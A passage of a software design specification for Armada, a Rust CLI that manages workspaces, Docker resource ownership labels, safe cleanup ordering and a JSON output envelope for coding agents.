# Armada — implementation plan

> **Status:** the complete specification — a fresh agent should be able to execute it without
> any prior conversation.
>
> **This document is in two parts.** §1–§12 specify **Manifest**, the workspace module formerly
> called charkit; that specification is unchanged by the widening of scope, because Manifest is
> agent-agnostic by design ([`ARCHITECTURE.md`](ARCHITECTURE.md) §1.9). §13–§15 specify the
> three modules stacked on it: **Guild**, **Fleet** and **Helm**. Part II is deliberately
> thinner, because the M0 spike found that most of the machinery it appeared to need already
> exists ([`PHASES.md`](PHASES.md) §9.1).
>
> **§4.1.1 records the five things this document left undecided and phase 1 had to settle**,
> along with every change the six fixtures forced. The config contract is frozen from here.
>
> **`PHASES.md` §0.1 and §0.2 are superseded by [`ARCHITECTURE.md`](ARCHITECTURE.md)**, which records what
> was actually decided. Everything else here stands.
>
> **For usage rather than specification, see [`reference.md`](commands/reference.md)** — one page per
> command with arguments, behaviour, output and dependencies.
>
> **Precedence: where this document and `ARCHITECTURE.md` disagree, `ARCHITECTURE.md` wins.**
> This is the specification of what to build; that is the record of what was decided about
> how. A conflict between them is a defect in one of them — fix it rather than picking a side
> silently, and say which document was wrong.
>
> **Binary:** `armada`, one of them · **Crates:** `armada-core`, `armada-manifest`,
> `armada-helm` ([`ARCHITECTURE.md`](ARCHITECTURE.md) §1.5, §1.9).
> **Language:** Rust (2021 edition) · **Platform:** POSIX only (macOS/Linux). Not Windows.
>
> **Both halves now use one spelling.** M1 converted Part I from the `char` spelling it was
> written in ([`PHASES.md`](PHASES.md) §8.3); Part II was written after the rename and was
> already there. The concepts never changed. [`glossary.md`](glossary.md) is the authority on
> every term.

## Contents

| § | | Read it when |
|---|---|---|
| **1** | What this is | Once, for orientation |
| **2** | Core concepts — workspace, identities, ownership, reaping, child env | **Always.** Everything depends on it |
| **3** | The verb surface — verbs, `--json` envelope, `data.results[]`, selectors, scope lens | **Always** |
| **4** | Configuration — `armada.yml`, `.armada/`, `manifest.db`, templating, `commands:`, nested workspaces, `secrets:` | **Always.** §4.1 is the schema |
| **5** | Bootstrap: the three-layer sandwich | Only for the evidence scanner or `config verify` |
| **6** | Service drivers — compose, command, `owns:` | Only for `up` / `down` / `clean` |
| **7** | Non-goals | Before proposing a feature |
| **10** | Decisions made — do not relitigate. §10.1 is the language decision | Before arguing with one |
| 8, 9, 11, 12 | **Moved to [`PHASES.md`](PHASES.md)** — phases, fixtures, source material, risks | Your phase only |

**This document is the contract** — verbs, config schema, envelope, identities, drivers — and
phase 1 has landed, so it is frozen. Sequencing lives in [`PHASES.md`](PHASES.md).

Companion documents, in precedence order — see `ARCHITECTURE.md` §2.8:
[`traps.md`](traps.md) (measured) › [`ARCHITECTURE.md`](ARCHITECTURE.md) (decided) ›
this file (specified) › [`PHASES.md`](PHASES.md) (sequenced) › [`AGENTS.md`](../AGENTS.md) (derived).

---

## 0. Start here

> **Phases 0, 1 and 2 are complete.** Phase 0 was a working session with the human and produced
> `ARCHITECTURE.md`, `AGENTS.md`, `traps.md` and the README's contributing section; the
> numbered steps below are kept as the record of what it did. Phase 1 turned §4 into a schema,
> six fixtures and a golden snapshot each — see §4.1.1. Phase 2 built the ownership layer on
> top of it. **Start at [`PHASES.md`](PHASES.md) §8.3 — M1.** (This document predates the M0–M4 milestones
> and its "Phase 3" no longer exists as a heading; the phase numbering was replaced.)

Read §2 (concepts), §4 (config) and [`PHASES.md`](PHASES.md) first — you need the shape of the thing to
have a useful conversation about how to build it. Then work through **Phase 0 — Foundations**
(in [`PHASES.md`](PHASES.md), and the numbered subsections 0.1–0.4 that live *inside* it) together:

1. Walk the human through the recommended architecture principles (0.1) and SDLC principles
   (0.2). Your job is to explain the *reasoning* and invite disagreement, not to collect
   agreement. A principle nobody argued with is usually one nobody read.
2. Get an answer to every question in 0.3. Those have no defensible default.
3. Write `docs/ARCHITECTURE.md`, `AGENTS.md`, and the README's contributing section.
   **Keep the rationale, not just the rules** — a rule without its reason gets discarded the
   first time it is inconvenient.
4. Stop. Phase 1 is a separate session.

Only then does building start — and phase 1 was still not the CLI. It was the repo skeleton
plus six fixture configs and their schema, and the schema was expected to change while they
were written; that is the phase working, not a setback. **Which fixture forced which change
is §4.1.1**, because that record is the justification for keeping the fixture.

Four rules that hold for the whole project:

- **Phase 0 produces documents, not code.** If a source file appears, the phase went wrong.
- **Phase 1 must land alone.** Every later phase codes against the config contract it
  establishes. Parallel agents cannot share a decision that has not been made yet — they will
  each invent an answer and you will get three incompatible ones.
- **Only phase 3's *harvester* may read the source repo** ([`PHASES.md`](PHASES.md) §9). If any other phase
  feels like it needs to look, the plan is underspecified — fix the plan, don't peek.
- **Do not relitigate §10.** Those decisions were made deliberately, with rationale recorded.

---

## 1. What this is

A CLI that gives coding agents one consistent vocabulary for managing a repo's tech stack,
so an agent working across several repos never has to re-derive how to start, check, or
clean up any of them.

It exists because five things go wrong in every repo, every day:

| # | Verb | The failure today |
|---|------|-------------------|
| 1 | Start the apps | Tilt here, `docker compose` there, a Procfile elsewhere. The agent guesses. |
| 2 | Run linters | Which tool, which scope, which fix flag, from which directory. |
| 3 | Run all tests | Including the ones needing services up, a browser, and a free port. |
| 4 | **Clean up after itself** | Nothing knows what a run created, so nothing can reliably destroy it. |
| 5 | **Initialize the code** | At the repo root *and* in a fresh worktree — deps, env, DB, non-colliding ports. |

**4 and 5 are the same bug**: you cannot clean up what you never claimed. That observation is
the entire design, and the primitive it produces is **stamp at creation, reap by stamp** —
every port, container, network, volume, image and process carries the workspace that made it,
so `clean` is a query rather than a memory.

**Said precisely, because the short version is wrong in a way that matters:** claiming does not
all happen at `init`. `init` claims the port block; `up` creates almost everything else. What
`init` and `clean` share is not a moment, it is the stamp — and an earlier phrasing here
("claiming happens at init") made it into the README as the design's whole justification while
being false for five of the six resource classes. The consequence of believing it is real: you
hook reaping to `init` alone and never reap on shrinkage.

**The one thing this primitive does not reach is the one thing worth being loud about.** A
resource outside the machine — a cloud database, a remote namespace — is stampable only if the
provider has labels Armada can filter on. `owns.release:` records those and **reports them,
never runs them** (§6.1). So the honest scope is: Armada reclaims everything it created locally,
and tells you about the rest.

### Evidence this is a real problem

From the source repo, `scripts/Armada/worktrees.py:110` exists because 29 leftover per-worktree
Docker networks exhausted Docker's default bridge address pool and broke Postgres startup for
every subsequently allocated worktree — *"accumulated exactly because nothing ever called
this."* That is failure mode #4, already paid for once.

---

## 2. Core concepts

### 2.1 Workspace

**A workspace is one directory tree containing a `armada.yml`, which gets its own runtime
state.** In practice: a checkout.

| Shape | Workspaces | Why |
|-------|-----------|-----|
| A repo, cloned once | 1 | One config, one port block, one `.armada/` |
| A repo + 4 git worktrees | **5** | **The case that matters.** Same committed `armada.yml`, five ids, five non-overlapping port blocks, five independent lifecycles. This is what lets five agents run concurrently on one machine. |
| A monorepo with 8 packages | 1 | Packages are *components* inside the workspace, not workspaces. **This is the default and should stay the default** — reach for §4.6 only when packages are genuinely separate products |
| A monorepo declaring nested workspaces (§4.6) | 1 + one per declaration | The exception: `apps/foo` and `apps/bar` are separate products that happen to share a repo and need independent lifecycles |
| Two separate `git clone`s | 2 | Separate `.git`, genuinely independent |

**How the workspace root is found.** Every verb resolves it the same way, and the answer must
be identical from anywhere inside the tree, because `workspace_id` is a hash of it:

> Walk up from the caller's cwd to the git root, collecting **every** `armada.yml` found.
>
> - **Exactly one** → that directory is the workspace root.
> - **Zero** → `bad_config`, naming the directories searched — *but only for verbs that need
>   a workspace; see below.*
> - **Two or more** → `bad_config`, *unless* the outer one declares the inner in
>   `workspaces:` (§4.6). If it does, the innermost wins.

**Not every verb needs a workspace.** The rule is: *asking about this workspace requires a
`armada.yml`; asking about the machine does not.*

| Requires a `armada.yml` | Runs without one |
|---|---|
| `init` `up` `down` `check` `clean` `status` `config verify` `agents-md` | `armada manifest config scan` (§5 layer 1 — it exists to run *before* a config does) |
| | `armada manifest status --all` |
| | `armada manifest clean --all --orphaned` |

The machine-scoped cases matter more than they look. `clean --orphaned` is most needed from
*outside* any workspace — from a shell that happens to be anywhere — and nothing else on the
machine reaps orphaned ports and containers. A rule that made it resolve a local workspace
first would fail before it could do the one job only it does.

Anchoring on `armada.yml` rather than always the git root, because the two differ in exactly
the cases that matter: in a monorepo a package may sit far below the root, and the git root
of a worktree is the worktree itself. One rule covers both. Stopping at the git root keeps a
stray `armada.yml` in a parent directory from capturing an unrelated repo — and means a git
submodule, which has its own git root, is correctly its own workspace for free.

Collecting *all* of them rather than taking the nearest is what makes an accidental nested
`armada.yml` fail loudly instead of silently creating a second owner for the same source. The
walk is bounded by directory depth, so it costs nothing.

Do **not** rename this concept. "Workspace" already means roughly this in VS Code,
Terraform, cargo and pnpm, so an agent arrives knowing it. Inventing vocabulary works
directly against the project's thesis that an agent learns this once. (If the overload with
pnpm/npm workspaces ever genuinely bites, the fix is `checkout`, not an invented word.)

### 2.2 Two derived identities

Distinct newtypes, not two `String` aliases — both are 8 hex characters, and passing one where
the other belongs must not compile:

```rust
pub struct WorkspaceId(String);
pub struct ProjectId(String);
```

```text
workspace_id = sha1(realpath(workspace_root))[..8]
project_id   = sha1(realpath(`git rev-parse --path-format=absolute --git-common-dir`))[..8]
```

> **`--path-format=absolute` is load-bearing, and `realpath` alone is not enough.** Plain
> `git rev-parse --git-common-dir` returns a path *relative to cwd* — `.git` from the repo
> root, `../.git` from a subdirectory — so hashing it directly yields a different project id
> depending on where the command ran. Applying `realpath` looks like a fix and is not: it
> resolves against **the calling process's** cwd, while §1.4 of `ARCHITECTURE.md` forbids
> reading cwd below the entrypoint, so Armada runs git with `current_dir(workspace_root)` and
> then resolves `../.git` against its own cwd. Wrong id, silently. Measured: with
> `--path-format=absolute` (git ≥ 2.31) the answer is identical from every directory, and
> `realpath` remains only to resolve symlinks. **Subtler than it looks — from inside a
> worktree the plain form already returns an absolute path, so this fails only in a
> subdirectory of the main checkout.** It silently breaks `--project` scoping, the
> database's project filter, and the guarantee that worktrees group with their parent. Verify
> this behaviour before changing the line; it is not obvious from the command's name.

Known and accepted, and worse than an earlier draft claimed. That draft said deleting the
parent checkout "regroups every surviving worktree… recoverable by recomputation". **Measured:
it does not regroup — it becomes underivable.** Inside an orphaned worktree,
`git rev-parse --path-format=absolute --git-common-dir` prints `fatal: not a git repository:
(null)`, so there is no key to recompute:

```sh
rm -rf main/                     # the parent checkout
cd wt && git rev-parse --path-format=absolute --git-common-dir
# fatal: not a git repository: (null)
```

This is survivable only because `project_id` **owns nothing** (below). Armada therefore treats an
underivable project as `project: null` rather than an error: `--project` scoping and the
database's project filter stop working for that worktree, `--all` and the workspace id keep
working, and nothing leaks. Making it fatal would take a worktree whose resources are perfectly
reclaimable and refuse to reclaim them.

- **workspace id** — owns ports, containers, networks, processes, locks. One per checkout.
- **project id** — owns nothing. Purely the grouping key: every worktree shares one
  `--git-common-dir` with the checkout it came from.

Both are *derived*, never stored as truth, so they survive a deleted `.armada/` and can be
recomputed by anything. `realpath` matters — symlinked checkouts must not get two identities.

**Workspaces in a project are siblings, not parent and children.** The root checkout is
just another workspace with no authority over the worktrees. This is load-bearing: model it
as a hierarchy and `armada manifest clean` in the root implies cascading into the worktrees, killing
services another agent is actively using. Flat siblings plus an explicit `--project` flag
makes the destructive step something you have to ask for.

### 2.3 Ownership

Every port, container, network, **volume**, **image** and process Armada creates is stamped
with the workspace id. That single fact is what makes `clean` correct, and it is the highest-value
primitive in the project.

- Containers/networks/**volumes**/images: **three** labels — `armada.workspace=<id>`,
  `armada.workspace_path=<realpath>` and `armada.namespace=<id>` (§2.3.1) — see §2.3.1 for why the second one is not redundant.
  **Networks and volumes must be stamped separately from services** — compose does not
  propagate a service's labels to either (`traps.md`), so stamping services is not stamping the
  stack. Volumes were absent from this vocabulary entirely until a review found it; a named
  volume outlives `down`, outlives the container, and is invisible to every filter Armada would
  otherwise use to find it.
- Processes: tracked process-group id, spawned in a new session via `setsid` (see
  [`traps.md`](traps.md) — **not** `process_group(0)`, which conflicts with it), killed with
  `killpg`. **Recorded in `~/.armada/manifest.db` (§4.3), not in the workspace** — a pgid
  recorded inside a directory that gets deleted is a leaked process
- Ports: claimed blocks in `~/.armada/manifest.db`, released on `clean`

### 2.3.1 Reaping happens automatically, at `armada manifest init` and `armada manifest clean`

**The plan's one piece of empirical evidence is a sweep function that existed and was never
called.** An earlier draft answered that with `armada manifest clean --orphaned` — a manual, opt-in flag
on a verb nobody runs in a workspace they are not in. That is the same bug with a new name.

So `armada manifest init` reaps first, then claims:

1. **Registry pass.** Drop `workspaces` rows whose `path` no longer exists, releasing their
   port blocks and `owned` rows.
2. **Resource pass.** Find every resource labelled `armada.workspace=*`, read its
   `armada.workspace_path` label, and **`stat` that path. Remove only on `ENOENT`.**

   **Any other errno means "adopt or report", never remove.** Measured: `stat` on a *live*
   directory under a mode-000 parent returns `EACCES`, which is byte-identical in failure to a
   missing path. That is exactly the multi-user and devcontainer case this label was added for
   — `$HOME` is 0700 on Linux — so a naive "stat failed → gone" reintroduces the bug the label
   exists to prevent.
3. **Lease pass.** Delete leases whose heartbeat has gone cold (§4.3).

**Why pass 2 reads a path label rather than checking the database.** An earlier draft removed
any resource whose id had no row, claiming this "does not depend on the record being intact —
the label is enough." That is backwards, and dangerously so. `workspace_id` is
`sha1(realpath(path))[..8]` — a **one-way hash** — so from a label alone Armada cannot recover
the path and cannot ask whether that workspace still exists. The only way to answer was to
consult the database, which makes **a missing row indistinguishable from a dead workspace.**

The database is per-`$HOME`; the Docker daemon is per-machine. So every one of these deleted a
*running* workspace's containers:

| Situation | Result under the old rule |
|---|---|
| A second user account on the same machine | Their running stack removed |
| A devcontainer or CI user with its own `$HOME` | Same |
| `manifest.db` deleted, corrupted, or on a synced home directory | **Your own** running stack removed |

That is §2.2's flat-siblings guarantee — `clean` must never cascade into a workspace another
agent is using — reintroduced by the very mechanism added to fix the plan's motivating bug.

**`clean` filters on both labels, not the id alone.** `workspace_id` is 32 bits, and every
`owns:` selector in §6.1 is id-only — so a collision would have `armada manifest clean` in one workspace
destroy another's live containers, the single thing §2.2's flat-siblings model exists to
prevent. The path label already exists; using it costs nothing and closes it.

**A third label, `armada.namespace=<id>`, scopes the whole mechanism to one filesystem view.**
The id is a UUID written into `~/.armada/manifest.db` when it is created. Reaping considers only
resources carrying **this** namespace; anything else is reported, never removed.

Without it, path-based reaping is actively dangerous the moment two `armada` installations share
a Docker daemon — which is the ordinary devcontainer setup, where the socket is mounted through
and the same containers are visible from both sides. A workspace at `/workspaces/repo` inside
the container is `ENOENT` when a host-side `armada manifest init` stats it, so the host reaps a live
workspace's containers. §2.3.1 exists because the previous version of this mechanism could
delete a running workspace's resources; a path label that means different things in different
mount namespaces reintroduces exactly that, and the section that introduced the path label
cites devcontainers as the reason for it.

Stamping the path makes pass 2 **self-sufficient**: it stats a real directory and consults
nothing. "Labelled, no row, but the path exists" is now **adopt or report, never remove.**

Two costs, accepted: two extra labels per resource, and the workspace path becomes visible in
`docker inspect` to anyone on the machine. Hashing the path instead would hide it but destroy
the only property that matters — you cannot `stat` a hash.

**This is why the label vocabulary had to be settled before phase 1.** It is stamped into
every resource Armada ever creates; changing it later leaves everything created beforehand
unreapable by the new logic, which is precisely the orphan class the tool exists to prevent.

**Reaping runs at `init` *and* `clean`, because `init`-only misses shrinkage entirely.** The
argument for `init` is that repeated worktree create/destroy always runs `init` in the new one
— true for churn, false for the last one. Delete worktree 5 of 5 and nothing reaps until
somebody happens to create worktree 6, which on a shrinking project is never. `clean` already
walks the same tables and is the verb whose job this is; adding the pass costs one query and
closes the case where the leak lasts longest.

`init` is still the right *primary* hook, for three reasons: it is where the outage actually originated
(repeated worktree create/destroy always runs `init` in the new one), it already holds the
database open to claim a port block, and it is infrequent enough that a docker call costs
nothing noticeable.

**`clean` has a fixed order, because a SIGKILL part-way through must not make things worse.**
Kill the process group and remove labelled resources **before** deleting any row: a row deleted
first leaves a live process with no record, which is the unreclaimable state this whole section
exists to prevent, while a resource removed first leaves a stale row that the next `init` reaps
for free. Ordering is cheap and the asymmetry is total — one direction degrades to a leak, the
other to a no-op.

```
0. run lease   HELD THROUGHOUT — released last, at step 7
1. leases      release this workspace's cpu-slots and exclusives only
2. processes   killpg TERM -> grace -> KILL, confirm gone
3. docker      containers, then networks and volumes, then built images
4. ports       release the block
5. rows        delete owned/workspaces rows
6. .armada/      remove the directory
7. run lease   release
```

**Step 0 is the whole point and an earlier version of this list got it backwards** — it
released the run lease first, annotated "so nothing new starts", which is precisely what lets
something new start. A concurrent `armada manifest up` would take the freed lease and start services into
a workspace being torn down, which is the race the lease was extended to `clean` to close.
Only the *resource* leases go early, and only because holding a cpu-slot while tearing down
blocks other workspaces for no reason.

**`up` records before it spawns, and this is the opposite of `clean`'s order.** `clean` kills
before deleting rows; `up` writes the row before creating the resource. Both follow the same
rule — **the failure mode must be a stale row, never an untracked resource** — and the rule
inverts because one direction is creating and the other destroying. Spawn-then-record leaks a
pgid if Armada dies in between, and a leaked pgid is exactly the unreclaimable state this section
exists to prevent; record-then-spawn leaves a row pointing at nothing, which the next `init`
reaps for free. The intent row is written, the resource created, then the row completed with
the real handle.

**Reaping is reported, never silent** — in human output and under `data.reaped` in `--json`.
A tool that removes containers without saying so is worse than one that does not remove them.

`armada manifest clean --orphaned` remains, for reaping without initialising anything.

**A run whose workspace is deleted under it must notice, because every symptom is
misleading.** Measured: writes to an already-open log fd **succeed silently** into an unlinked
inode, opening a new file gives `ENOENT`, `getcwd()` gives `ENOENT`, and spawning a child gives
rc 128 with `fatal: Unable to read current working directory`. So the run continues, its logs
go nowhere, and every remaining check reports `tool_failed` with an opaque git error rather
than the actual cause. Armada stats the workspace root before each check dispatch — one syscall —
and on `ENOENT` ends the run `ABORTED` with class `environment` naming the deleted path. Also
measured: `git worktree remove` succeeds with no `--force` and no complaint while a process is
running inside it, so the deletion vector this project is built around is entirely silent.

**A process whose workspace was deleted is reclaimable, given `boot_id` and `pid_started_at`
(§4.3).** The naive version cannot distinguish "pgid 4212 is my orphaned service" from "pgid
4212 was recycled by the OS", so it can only report. Recording the boot id and the process
start time alongside the pgid makes recycling detectable: same boot, same start time, it is
ours and `killpg` is safe; anything else is stale and the row is dropped. Without them every
pgid row survives a reboot as a permanent phantom leak in `status --all`.

**Pass 1 removes a `workspaces` row only on `ENOENT`, exactly like pass 2.** The rule was
stated for pass 2 and left implicit for pass 1, which is the same defect in the cheaper half: a
live workspace on a network mount that is momentarily unavailable answers `EACCES` or `EIO`,
and dropping its row releases a port block it is still using.

**Images are here because leaving them out makes `clean` wrong at the largest scale.** The
source repo already sweeps orphaned images and records roughly 2.1 GB per production app
build — the single biggest thing a stale workspace holds.

**But only images Armada causes to be *built*.** A pulled image such as `postgres:16` is shared
with everything else on the machine and was never Armada's to remove. Built images are stamped
through `build.labels` in the compose document Armada generates (§6.0). An earlier draft said
stamping meant "passing the label through to compose" — `docker compose` has no `--label`
flag, so that was wrong; the label reaches the image through the generated document instead.

### 2.4 What every child process inherits

Armada sets two variables in the environment of every process it spawns — services, checks and
`commands:` entries alike. Neither is declared anywhere; both are always present:

```
ARMADA_WORKSPACE=a3f91c02       this workspace's id
ARMADA_RUN_ID=<run-id>          the run this process belongs to, when inside one
```

`ARMADA_RUN_ID` exists so a nested invocation can *join* the outer run rather than starting a
second one — a child that finds it set knows it is already inside a run and inherits its
lock rather than contending for it. The source repo already does exactly this with
`ARMADA_CHECK_RUN_ID`, including reading it back to detect nesting, so this is a confirmed
requirement rather than a guess.

Automatic rather than a substitution: it needs no declaration, nothing to typo, and it works
for a script Armada has never been told anything about.

---

## 3. The verb surface

Six verbs, identical in every repo. This is the entire surface an agent memorizes;
everything else is config. **Every verb takes `--json`.**

| Verb | Contract | Terminal states |
|------|----------|-----------------|
| `armada manifest init` | Workspace ready: run each component's setup, claim a port block, write `.armada/`. Idempotent **in Armada's own state** — see §4.1. | `READY` `FAILED` |
| `armada manifest up` | Services running and ready-checked. Records what it started as `owned` rows in `~/.armada/manifest.db` (§4.3). | `UP` `PARTIAL` `SKIPPED` `FAILED` `TIMEOUT` |
| `armada manifest down` | Services stopped. Port block **kept** — still your workspace. | `DOWN` `PARTIAL` `FAILED` |
| `armada manifest check` | Lint / format / test. Scoped, scheduled, leased, ceilinged. `--detach` / `--status` / `--wait` / `--fix` / `--files` / `--all-files` / `--concurrency`. | `PASS` `SKIPPED` `FAILED` `ABORTED` `DEAD` `TIMEOUT` |
| `armada manifest clean` | Release everything this workspace owns — ports, containers, networks, images, leases — and remove `.armada/`. Declared `release:` commands are **reported, never run** (§6.1). Build artifacts only with `--artifacts`; `--force` overrides the liveness guard; `--orphaned --force-rebuild` recovers an unreadable `manifest.db` (§4.3). | `CLEAN` `PARTIAL` `SKIPPED` `FAILED` |
| `armada manifest status` | What's running, what's mine, what's stale, what a run is doing now. | `OK` `FAILED` |

Plus: `armada manifest config scan`, `armada manifest config verify`, `armada manifest agents-md [--write|--verify]`,
`armada manifest explain [<check-id>]` (§3.4), and any repo-local verbs the repo declares in `commands:`
(§4.5) — which Armada dispatches but does not define.

#### Reserved, not built: root-level aliases for the most-used verbs

**M1 is the moment this regresses, which is why it is recorded here rather than left to
memory.** Today these verbs sit at the root — `armada manifest check`. M1 namespaces them under their
module, so the same command becomes `armada manifest check`. That is correct: Armada is a suite
and these verbs are specific to a workspace it happens to be working in. It also makes the
thing you type fifty times a day four words long.

The intended resolution is that the most-used verbs also answer at the root, `armada check`
being `armada manifest check`. Three rules make that safe, and all three are load-bearing:

**1. Dynamic availability is safe; dynamic meaning is not.** `armada check` must *always* mean
`armada manifest check`. Outside a workspace it fails with "no `armada.yml` here" — it never
resolves to a different module's verb because of where you are standing. What may vary with
context is only what `--help` lists and what shell completion offers. Anything more breaks the
promise this section opens with: **six verbs, identical in every repo, the entire surface an
agent memorizes.** A verb whose meaning depends on the working directory breaks it the first
time a script runs from the wrong one.

**2. A verb may be promoted only if exactly one module owns it.**

| | Verbs |
|---|---|
| Promotable — Manifest only | `check` `up` `down` `clean` `status` `explain` |
| Promotable — Fleet only | `spawn` `ls` `board` `kill` `answer` `inbox` |
| **Never** | `init` — three modules own it, and `armada init` is already machine setup |
| **Never** | `edit` `push` `pull` — Guild-only, but too generic to spend the root namespace on |

**3. The real cost is the schema, not the CLI.** §4.5 forbids a `commands:` entry from
shadowing a built-in verb. Promoting an alias **grows that forbidden list** — the moment
`check` is a root verb, no repository may declare a command named `check`. So the alias set and
the schema rule land together, and this gets more expensive the longer it waits, because every
repository that declares one of those names in the meantime becomes a migration.

Not built, and deliberately not scheduled: it is ergonomics, and it should be decided after M1
has actually made the four-word form the default and it is clear which verbs genuinely chafe.

**`armada manifest init` means exactly one thing: make this workspace ready.** An earlier draft also
assigned it §5's layer-1 evidence scan, which by definition runs where no `armada.yml` exists —
so that verb had two unrelated behaviours, two output shapes, and could only fail in the
state half of it existed to serve. The scan is `armada manifest config scan`, which puts layers 1 and 3
of the bootstrap sandwich in one namespace: **scan** produces evidence, an agent authors,
**verify** checks the result.

**One spelling for failure: `FAILED`.** An earlier draft used `FAIL` for `check` and `FAILED`
for `init` / `up` — two tokens for one idea, in the one place the project claims six verbs
behave identically. The complete enum:

```
TERMINAL — every one maps to an exit code (ARCHITECTURE.md §1.6)

  READY  UP  DOWN  CLEAN  PASS  OK         success
  SKIPPED                                  nothing to do; exit 0, not PARTIAL
  PARTIAL                                  some succeeded, some did not
  FAILED                                   did not achieve its goal
  ABORTED  DEAD  TIMEOUT                   did not finish

PROGRESS — a run in flight; never terminal, never mapped to an exit code

  RUNNING                                  executing
  WAITING                                  not executing; `waiting_on` says why
```

### 3.1 The `--json` envelope

**Fixed in phase 1, alongside the config contract, and for the same reason.** Four things
consume it — the MCP server (phase 5), the dogfood test (phase 3), agents, and the golden
snapshots — and none of them can invent it independently without the three incompatible
answers [`PHASES.md`](PHASES.md) §8 warns about.

```json
{ "schema_version": 1,
  "verb":           "check",
  "workspace":      "a3f91c02",
  "status":         "FAILED",
  "error":          null,
  "data":           { "runs": [] } }
```

| Field | Meaning |
|---|---|
| `schema_version` | One global version for the whole CLI contract. Adding a field does not bump; removing one or changing its type does. |
| `verb` | Which verb produced this |
| `workspace` | **Always the invoking workspace**, even under `--project` / `--all`. Other workspaces appear inside `data`, so the envelope shape never varies. |
| `status` | The terminal state from the table above |
| `error` | The typed error object (§1.7 of `ARCHITECTURE.md`) or `null` |
| `data` | The per-verb body. **Defined by the phase that builds the verb**, not here. |

The body is nested rather than flattened so the envelope is generically validatable — one
schema checks the wrapper, a per-verb schema checks `data` — and so a future verb can add a
field called `status` or `error` without colliding with the envelope.

#### `data.results[]` — because every verb is plural

**Fixed in phase 1 with the envelope, for the same reason.** An earlier draft left `data`
"defined by the phase that builds the verb", which meant the most common question after a
failure — *which check failed, why, and where is its output* — had no specified answer on the
verb agents call most. The argument that fixed the envelope applies verbatim here.

Every verb acts on many things: `check` runs N checks, `up` starts N services, `clean --all`
touches N workspaces. So they share one array shape, learned once:

```json
{ "schema_version": 1, "verb": "check", "workspace": "a3f91c02",
  "status": "FAILED",
  "error": { "class": "tool_failed", "where": "api:lint",
             "message": "2 of 4 checks did not pass" },
  "data": {
    "run_id": "01J8X2",
    "results": [
      { "id": "web:lint", "status": "PASS",    "duration_ms": 840,
        "log": ".armada/run/01J8X2/logs/web.lint.log" },
      { "id": "api:lint", "status": "FAILED",  "duration_ms": 3120,
        "log": ".armada/run/01J8X2/logs/api.lint.log",
        "error": { "class": "tool_failed", "message": "ruff: 7 errors" } },
      { "id": "web:e2e",  "status": "TIMEOUT", "duration_ms": 900000,
        "error": { "class": "timeout", "message": "exceeded timeout: 900s" } },
      { "id": "api:test", "status": "ABORTED", "duration_ms": 0 }
    ] } }
```

**The top-level `error` is the strict maximum over `results[]`** by a fixed precedence, so two
implementations cannot disagree — and note what that means for the payload above: it contains a
`TIMEOUT`, so the aggregate is `timeout` and the run exits **4**, not 1. That is deliberate. A
gate reading 1 goes looking for a broken test; reading 4 it raises a deadline or asks why the
suite got slow. The strictly-worse signal wins because acting on the milder one wastes the
time the stricter one was reporting.

```
armada_bug > environment > bad_config > bad_invocation > timeout > aborted > tool_failed
```

**`bad_invocation` was missing from this list until phase 1 encoded it**, and the omission was
not cosmetic: a `check` whose service is not running fails `bad_invocation` (phase 3), so a run
mixing one of those with an ordinary test failure had no defined maximum — the one thing this
ordering exists to prevent. It ranks above `tool_failed` and `timeout` for the reason
`bad_config` does — the caller has to change what they asked for before any other result means
anything — and below `bad_config`, because a wrong config is wrong for every future invocation
while a wrong invocation is wrong only for this one.

`environment` sits second because it invalidates everything below it: when Docker is down or
the disk is full, the four failures underneath are consequences, and reporting one of them
sends the caller to fix a repo that is fine.

**`where` has two grammars, and the class picks which.** For `bad_config` it is a path into
the config — `armada.yml:components.api.checks.lint.cmd` — because the actionable thing is the
line to edit. For every other class it is the id from `results[]` — `api:lint` — because the
actionable thing is the check. An agent can tell them apart by the `armada.yml:` prefix, and
does not need to: `next_action` is required for `bad_config` and says what to do.

**`PARTIAL` joins the terminal states** for the case where some succeeded and some did not.
It earns its place on `clean --all` and `up`, where "three of five worked" and "nothing
worked" demand different actions and would otherwise both read `FAILED`.

**`check` never reports `PARTIAL`.** One failing check fails the run — that is what a merge
gate needs, and "three of five passed" is not a different action from "none passed" when the
action is *fix the failing one*. `results[]` itemises exactly which, so nothing is lost by
saying it once at the top. A whole run where every selected check was `SKIPPED` reports
`SKIPPED`, not `PASS`: nothing ran, and claiming approval for that is the failure mode §4.1's
empty-`${files}` rule exists to prevent.

#### `RUNNING` and `WAITING` are progress, not verdicts

An earlier draft listed `BLOCKED` among the *terminal* states, which broke the exit-code rule:
`exit = f(error.class)` with no class yields **0**, so a run that acquired nothing and did
nothing would report success — in a merge gate. It also read as a fault, when the ordinary case
is simply waiting a turn.

**A run never ends `RUNNING` or `WAITING`.** It acquires and produces a real verdict, or the
acquisition ceiling expires and it ends `FAILED` with class `aborted` — retryable, because the
actionable fact is that the machine was busy rather than that this check is slow.

These two also fill a gap `--detach` had: every other state is terminal, so a detached run had
nothing correct to report to `armada manifest check --status` while it was still going.

**Captured output is capped at 10 MB per check, head and tail retained with the middle
elided.** `run_retention` is a count of runs, not a size, so nothing bounded a single run: a
`commands:` entry writing gigabytes to stdout under `stdio: pipe` fills the disk with Armada
faithfully copying every byte, and the disk-full failure then lands on the state store. The
cap is stated in `results[].log` when it trips, so a truncated log never reads as a complete
one.

**`--status` is a *read verb*, and read verbs are the one place the envelope's top-level
`status` may be a progress state.** Everywhere else it is terminal by definition (§3.1). The
exception is confined to the three things that only query — `armada manifest status`, `armada manifest check
--status`, and `armada manifest explain` (§3.4) — because a query about a run reports the run's state, and
`RUNNING` is the true answer.

**`--status` exits on the success of the query, not on the verdict of the run.** An in-flight
run answers `status: RUNNING`, exit **0** — the query worked. This is the one place where exit
0 does not mean "the thing you asked about is fine", so it is stated rather than left to be
discovered: **a gate must use `--wait`, never `--status`.** `--status` is for a human or an
agent polling; `--wait` blocks and exits on the run's real class. Exit codes from `--status`
are about the query — `2` for an unknown run id, `3` if the config no longer parses.

**`results[].id` is a different grammar per verb, and that is intended.** It is a check id
for `check`, a component name for `init`/`up`/`down`, a workspace id for `clean --all`. One
field, because the *shape* is what an agent learns once — iterate `results[]`, read `status`,
read `error` — and the id is opaque to that loop. It is only ever compared against ids from
the same verb's payload.

**`waiting_on` carries the distinction that matters** — whether the cause is inside this
workspace or outside it:

```json
{ "id": "api:test",  "status": "WAITING",
  "waiting_on": { "cpu_slot": 4, "available": 2 } }

{ "id": "web:e2e",   "status": "WAITING",
  "waiting_on": { "exclusive": "browser", "held_by": "7c21ab90", "since_ms": 44000 } }
```

The first is this run's own budget and will clear on its own. The second names **another
